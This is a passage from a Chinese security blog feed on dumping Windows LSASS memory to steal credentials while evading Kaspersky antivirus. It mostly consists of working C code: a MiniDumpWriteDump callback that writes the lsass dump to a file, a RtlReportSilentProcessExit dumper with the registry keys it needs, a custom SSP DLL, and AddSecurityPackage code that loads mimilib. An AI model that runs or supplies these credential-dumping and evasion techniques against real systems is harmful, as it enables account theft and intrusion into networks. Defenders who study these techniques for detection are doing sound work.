class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">MiniDumpWriteDump</span>(<span class="params"></span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>] HANDLE                            hProcess,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>] DWORD                             ProcessId,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>] HANDLE                            hFile,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>] MINIDUMP_TYPE                     DumpType,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>] PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>] PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>] PMINIDUMP_CALLBACK_INFORMATION    CallbackParam</span></span></div><div class="line"><span class="function"><span class="params"></span>)</span>;</div></pre></td></tr></table></figure></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//回调函数</span></div><div class="line"><span class="function">BOOL CALLBACK <span class="title">minidumpCallback</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">__in     PVOID callbackParam,</span></span></div><div class="line"><span class="function"><span class="params">__in     <span class="keyword">const</span> PMINIDUMP_CALLBACK_INPUT callbackInput,</span></span></div><div class="line"><span class="function"><span class="params">__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput</span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">LPVOID destination = <span class="number">0</span>, source = <span class="number">0</span>;</div><div class="line">DWORD bufferSize = <span class="number">0</span>;</div><div class="line"><span class="keyword">switch</span> (callbackInput-&gt;CallbackType)</div><div class="line">&#123;</div><div class="line"><span class="keyword">case</span> IoStartCallback:</div><div class="line">callbackOutput-&gt;Status = S_FALSE;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> IoWriteAllCallback:</div><div class="line">callbackOutput-&gt;Status = S_OK;</div><div class="line">source = callbackInput-&gt;Io.Buffer;</div><div class="line">destination = (LPVOID)((DWORD_PTR)buffer + (DWORD_PTR)callbackInput-&gt;Io.Offset);</div><div class="line">bufferSize = callbackInput-&gt;Io.BufferBytes;</div><div class="line">bytesRead += bufferSize;</div><div class="line">RtlCopyMemory(destination, source, bufferSize);</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> IoFinishCallback:</div><div class="line">callbackOutput-&gt;Status = S_OK;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">default</span>:</div><div class="line"><span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">if</span> (IsElevated() == FALSE)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!] IsElevated \r\n"</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] run as Administor \n"</span>);</div><div class="line">SetDebugPrivilege();</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] set debug privilege \n"</span>);</div><div class="line">DWORD dwPid = GetLsassPid();</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] get pid of lsass:%d\n"</span>, dwPid);</div><div class="line">HANDLE hProcessOfLsass = OpenProcess(PROCESS_ALL_ACCESS, <span class="number">0</span>, dwPid);</div><div class="line"><span class="keyword">if</span> (hProcessOfLsass == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!] OpenProcess \r\n"</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] get handle of lsass \n"</span>);</div><div class="line"><span class="comment">//初始化MINIDUMP_CALLBACK_INFORMATION</span></div><div class="line">MINIDUMP_CALLBACK_INFORMATION callbackInfo;</div><div class="line">ZeroMemory(&amp;callbackInfo, <span class="keyword">sizeof</span>(MINIDUMP_CALLBACK_INFORMATION));</div><div class="line">callbackInfo.CallbackRoutine = &amp;minidumpCallback;</div><div class="line">callbackInfo.CallbackParam = <span class="literal">NULL</span>;</div><div class="line">pfnMiniDumpWriteDump MiniDumpWriteDump = (pfnMiniDumpWriteDump)GetProcAddress(</div><div class="line">LoadLibraryA(<span class="string">"Dbghelp.dll"</span>), <span class="string">"MiniDumpWriteDump"</span>);   </div><div class="line"><span class="keyword">if</span> (MiniDumpWriteDump == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!] get address of mimidumpwritedump \n"</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] get address of mimidumpwritedump \n"</span>);</div><div class="line">BOOL bResult = FALSE;</div><div class="line">bResult = MiniDumpWriteDump(hProcessOfLsass, dwPid, <span class="literal">NULL</span>, MiniDumpWithFullMemory, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;callbackInfo);</div><div class="line"><span class="keyword">if</span> (bResult == TRUE)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] mini dump write dump \n"</span>);</div><div class="line"><span class="keyword">long</span> <span class="keyword">int</span> size = bytesRead;</div><div class="line"><span class="keyword">char</span> *securitySth = <span class="keyword">new</span> <span class="keyword">char</span>[size];</div><div class="line"><span class="built_in">memcpy</span>(securitySth, buffer, bytesRead);</div><div class="line">DWORD bytesWritten = <span class="number">0</span>;</div><div class="line">HANDLE outFile = CreateFileW(<span class="string">L"dmplsass.bin"</span>, GENERIC_ALL, <span class="number">0</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</div><div class="line"><span class="keyword">if</span> (outFile != <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] create dump file \n"</span>);</div><div class="line">WriteFile(outFile, securitySth, bytesRead, &amp;bytesWritten, <span class="literal">NULL</span>);</div><div class="line">CloseHandle(outFile);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!] mimi dump %x\n"</span>, GetLastError());</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="0x03-RtlReportSilentProcessExit静默进程退出"><a href="#0x03-RtlReportSilentProcessExit静默进程退出" class="headerlink" title="0x03 RtlReportSilentProcessExit静默进程退出"></a>0x03 RtlReportSilentProcessExit静默进程退出</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before-part-2" target="_blank" rel="external">LSASS Memory Dumps are Stealthier than Ever Before - Part 2</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当进程被终止的时候，它会调用ntdll.dll的<code>RtlReportSilentProcessExit()</code>,然后与Windows 错误报告服务(<code>WerSvcGroup</code>下的<code>WerSvc</code>)通讯,然后WER服务将启动<code>WerFault.exe</code>，它将执行退出进程的转储。有趣的是，<code>调用此API不会导致进程退出</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Silent Process Exit是从windows7中引入的一种机制，该机制在1)自身调用ExitProcess()自行终止，或者2)另一个进程通过TerminateProcess()终止时,为受监控进程触发指定的操作，目前支持的操作有三种：1）启动监控进程 2）显示弹出窗口 3）创建转储文件</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用Silent Process Exit机制需要设置注册表项目。1）在<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\&lt;process.exe&gt;</code>的<code>GlobalFlag</code>键设置为<code>FLG_MONITOR_SILENT_PROCESS_EXIT (0x200)</code> 2)在<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\&lt;process.exe&gt;</code>项下设置三个属性<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">DumpType           <span class="number">0x02</span>        dump内存的类型</span></div><div class="line"><span class="ruby">-LocalDumpFolder    <span class="symbol">c:</span>\temp     这是dump后保存的地址</span></div><div class="line"><span class="ruby">-ReportingMode      <span class="number">0x02</span>        退出执行的操作</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\&lt;process.exe&gt;</code>项目下三个属性更为详细的介绍如下<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">ReportingMode</span> (REG_DWORD) 需要执行的操作</div><div class="line">* <span class="selector-tag">LAUNCH_MONITORPROCESS</span> (<span class="number">0</span>x1) – 启动一个监控进程</div><div class="line">* <span class="selector-tag">LOCAL_DUMP</span> (<span class="number">0</span>x2) – 为导致终止的进程和被终止的进程创建转储文件</div><div class="line">* <span class="selector-tag">NOTIFICATION</span> (<span class="number">0</span>x4) – 显示弹出通知</div><div class="line"><span class="selector-tag">LocalDumpFolder</span>(REG_SZ) 转储文件保存的路径</div><div class="line"><span class="selector-tag">DumpType</span>(REG_DWORD)转储文件类型</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<a href="https://forum.butian.net/share/887" target="_blank" rel="external">静默退出 DUMP LSASS.EXE</a>一文中有详细的代码介绍。在装了卡巴斯基的环境中，因为卡巴对于LSASS Dump的保护机制，第三方进程很难对LSASS进程进行转储，可以考虑利用注入的方式进行转储，或者使用文章中的RemoteCreateThread方法进行转储。但是此时可能又要准备绕过卡巴对于注入的监控。<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> main() </div><div class="line">&#123;</div><div class="line">PCWCHAR targetProcName = L<span class="string">"lsass.exe"</span>;</div><div class="line">DWORD pid = -<span class="number">1</span>;</div><div class="line">HMODULE hNtMod = NULL;</div><div class="line">fRtlReportSilentProcessExit fnRtlReportSilentProcessExit = NULL;</div><div class="line">HANDLE hLsassProc = NULL;</div><div class="line">NTSTATUS ntStatus = -<span class="number">1</span>;</div><div class="line"><span class="keyword">if</span> (!EnableDebugPriv()) &#123;</div><div class="line"><span class="keyword">printf</span>(<span class="string">" [!] EnableDebugPriv: %X\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"[+] EnableDebugPriv OK\n"</span>);</div><div class="line"><span class="keyword">if</span> (!setRelatedRegs(targetProcName)) &#123;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"[!] setRelatedRegs: %X\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"[+] setRelatedRegs OK\n"</span>);</div><div class="line">pid = getPidByName(targetProcName);</div><div class="line"><span class="keyword">if</span> (-<span class="number">1</span> == pid) &#123;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"[!] getPidByName: %#X\n"</span>, pid);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"+] getPidByName: %X\n"</span>, pid);</div><div class="line"><span class="keyword">do</span></div><div class="line">&#123;</div><div class="line">hNtMod = GetModuleHandleW(L<span class="string">"ntdll.dll"</span>);</div><div class="line"><span class="keyword">if</span> (!hNtMod) &#123;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"[!]GetModuleHandleW\n"</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"[+]GetModuleHandleW: %X\n"</span>, (DWORD)hNtMod);</div><div class="line">fnRtlReportSilentProcessExit = (fRtlReportSilentProcessExit)GetProcAddress(hNtMod, <span class="string">"RtlReportSilentProcessExit"</span>);</div><div class="line"><span class="keyword">if</span> (!fnRtlReportSilentProcessExit) &#123;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"[!]Get RtlReportSilentProcessExit\n"</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"[+] RtlReportSilentProcessExit地址: %X\n"</span>, (DWORD)fnRtlReportSilentProcessExit);</div><div class="line">hLsassProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, <span class="number">0</span>, pid);</div><div class="line"><span class="keyword">if</span> (!hLsassProc) &#123;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"[!] OpenProcess: %X\n"</span>, GetLastError());</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"[+] OpenProcess: %X\n"</span>, (DWORD)hLsassProc);</div><div class="line">ntStatus = fnRtlReportSilentProcessExit(hLsassProc, <span class="number">0</span>);</div><div class="line">&#125; <span class="keyword">while</span> (false);</div><div class="line"><span class="keyword">if</span> (hNtMod)</div><div class="line">CloseHandle(hNtMod);</div><div class="line"><span class="keyword">if</span> (fnRtlReportSilentProcessExit)</div><div class="line">CloseHandle(fnRtlReportSilentProcessExit);</div><div class="line"><span class="keyword">if</span> (hLsassProc)</div><div class="line">CloseHandle(hLsassProc);</div><div class="line"><span class="keyword">if</span> (fnRtlReportSilentProcessExit)</div><div class="line">fnRtlReportSilentProcessExit = NULL;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="0x04-LSASS-SSP自加载"><a href="#0x04-LSASS-SSP自加载" class="headerlink" title="0x04 LSASS SSP自加载"></a>0x04 LSASS SSP自加载</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSP，全称Security Support Provider，又名Security Package。针对绕过卡巴斯基的LSASS Dump可以使用<code>SSP</code>+<code>MiniDumpWriteDump</code>的方式。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-package" target="_blank" rel="external">Intercepting Logon Credentials via Custom Security Support Provider and Authentication Packages</a>一文中提供了如何编写一个可以使用的SSP dll文件。3gstudent在他的<a href="https://3gstudent.github.io/Mimikatz中SSP的使用" target="_blank" rel="external">Mimikatz中SSP的使用</a>介绍了SSP的基本原理和如何添加SSP的三种方法。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSP是一个dll，不同的功能对应不同的导出函数。具体可以参见下面的代码。该代码主要包含5个函数</p><ul><li>SpInitialize 用于初始化SSP并提供函数指针列表，此处可以直接返回</li><li>SpShutDown 用于卸载SSP，暂时无法卸载。</li><li>SpGetInfo 提供有关SSP的信息，包括版本，名称和说明</li><li>SpAcceptCredentials 可以执行的操作。</li><li>SpLsaModeInitialize 导出函数。</li></ul><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">NTSTATUS NTAPI SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable) </div><div class="line">&#123; </div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line">NTSTATUS NTAPI SpShutDown(void) </div><div class="line">&#123; </div><div class="line"><span class="keyword">return</span> <span class="number">0</span>; </div><div class="line">&#125;</div><div class="line">NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo)</div><div class="line">&#123; </div><div class="line">PackageInfo-&gt;fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;</div><div class="line">PackageInfo-&gt;wVersion = <span class="number">1</span>;</div><div class="line">PackageInfo-&gt;wRPCID = SECPKG_ID_NONE;</div><div class="line">PackageInfo-&gt;cbMaxToken = <span class="number">0</span>;</div><div class="line">PackageInfo-&gt;Name = L<span class="string">"KiwiSSP"</span>;</div><div class="line">PackageInfo-&gt;Comment = L<span class="string">"Kiwi Security Support Provider"</span>;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line">NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (flag == <span class="keyword">FALSE</span>)</div><div class="line">ProcessMain();  <span class="comment">//可以执行的操作</span></div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line">SECPKG_FUNCTION_TABLE SecurityPackageFunctionTable[] =</div><div class="line">&#123;</div><div class="line">&#123;</div><div class="line"><span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>,SpInitialize, SpShutDown, SpGetInfo, SpAcceptCredentials, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span></div><div class="line">&#125;</div><div class="line">&#125;;</div><div class="line"><span class="comment">// SpLsaModeInitialize is called by LSA for each registered Security Package</span></div><div class="line">extern <span class="string">"C"</span> __declspec(dllexport) NTSTATUS NTAPI SpLsaModeInitialize(<span class="keyword">ULONG</span> LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables)</div><div class="line">&#123;</div><div class="line">*PackageVersion = SECPKG_INTERFACE_VERSION;</div><div class="line">*ppTables = SecurityPackageFunctionTable;</div><div class="line">*pcTables = <span class="number">1</span>;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;添加SSP主要有三种方法。</p><ul><li><p>方法一:等待重启</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(1) 将ssp.dll复制到c:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32</div><div class="line">(2) 修改HKEY_LOCAL_MACHINE<span class="symbol">\S</span>ystem<span class="symbol">\C</span>urrentControlSet<span class="symbol">\C</span>ontrol<span class="symbol">\L</span>sa<span class="symbol">\的</span>Security Packages的值设置为ssp.dll</div><div class="line">(3) 等待系统重新启动</div></pre></td></tr></table></figure></li><li><p>方法二：调用AddSecurityPackage</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">(<span class="number">1</span>)(<span class="number">2</span>)同方法一</div><div class="line">(<span class="number">3</span>)调用AddSecurityPackage</div><div class="line">//测试代码如下</div><div class="line">//<span class="meta">#define SECURITY_WIN32</span></div><div class="line">//<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line">//<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></div><div class="line">//<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Security.h&gt;</span></span></div><div class="line">//<span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="string">"Secur32.lib"</span>)</span></div><div class="line"><span class="built_in">int</span> main(<span class="built_in">int</span> argc, char **argv) </div><div class="line">&#123;</div><div class="line">SECURITY_PACKAGE_OPTIONS option<span class="comment">;</span></div><div class="line">option.Size = sizeof(option)<span class="comment">;</span></div><div class="line">option.Flags = <span class="number">0</span><span class="comment">;</span></div><div class="line">option.Type = SECPKG_OPTIONS_TYPE_LSA<span class="comment">;</span></div><div class="line">option.SignatureSize = <span class="number">0</span><span class="comment">;</span></div><div class="line">option.Signature = <span class="literal">NULL</span><span class="comment">;</span></div><div class="line">SECURITY_STATUS SEC_ENTRYnRet = AddSecurityPackageA(<span class="string">"mimilib"</span>, &amp;option)<span class="comment">;</span></div><div class="line"><span class="keyword">return</span> <span class="number">0</span><span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>方法三:使用RPC控制lsass加载SSP:这个方法的优势在于无需有过多敏感的痕迹(写注册表，调用AddSecurityPackage，不需要对lsass进程的内存进行写操作，lasss进程中不存在加载的dll)，这个方法是XPN大佬发现的，其开源在他的<a href="https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e" target="_blank" rel="external">github</a>中，并在他的博文<a href="https://blog.xpnsec.com/exploring-mimikatz-part-2/" target="_blank" rel="external">exploring-mimikatz-part-2/</a>一文中有详细的介绍，其大概意思就是通过逆向分析AddSecurityPackage API函数，发现内部是通过RPC调用实现加载SSP.dll的。</p></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过测试使用SSP+MiniDumpWriteDump回调的方式会造成系统卡死，原因，和@seventeen师傅了解了，可能是巨硬家使用SSP并不支持回调。所以我直接使用SSP+MiniDumpWriteDump，并没有采用回调方式可以成功转储。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[+] 1. <a href="https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf" target="_blank" rel="external">Some ways to dump LSASS.exe</a></p><p>[+] 2. <a href="https://xz.aliyun.com/t/10107" target="_blank" rel="external">几种免杀转储lsass进程的技巧</a> </p><p>[+] 3. <a href="https://forum.butian.net/share/887" target="_blank" rel="external">静默退出 DUMP LSASS.EXE</a></p><p>[+] 4. <a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-package" target="_blank" rel="external">Intercepting Logon Credentials via Custom Security Support Provider and Authentication Packages</a></p><p>[+] 5. <a href="https://3gstudent.github.io/Mimikatz中SSP的使用" target="_blank" rel="external">Mimikatz中SSP的使用</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-现成工具&quot;&gt;&lt;a href=&quot;#0x01-现成工具&quot; class=&quot;headerlink&quot; title=&quot;0x01 现成工具&quot;&gt;&lt;/a&gt;0x01 现成工具&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;任务管理器&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;procdump:&lt;code&gt;procdump -ma lsass.exe lsass.dmp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Sharp dump:其核心也是使用&lt;code&gt;MiniDumpWriteDump&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Out-MiniDump:是PowerSploit下的一个&lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;转储组件&lt;/a&gt;。同理也是使用&lt;code&gt;MiniDumpWriteDump&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="windows安全" scheme="https://findream.github.io/categories/windows%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike BOF生成原理分析</title>
    <link href="https://findream.github.io/2022/11/26/Cobalt%20Strike%20BOF%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
    <id>https://findream.github.io/2022/11/26/Cobalt Strike BOF原理分析/</id>
    <published>2022-11-26T06:02:11.000Z</published>
    <updated>2022-11-12T07:14:20.771Z</updated>
    
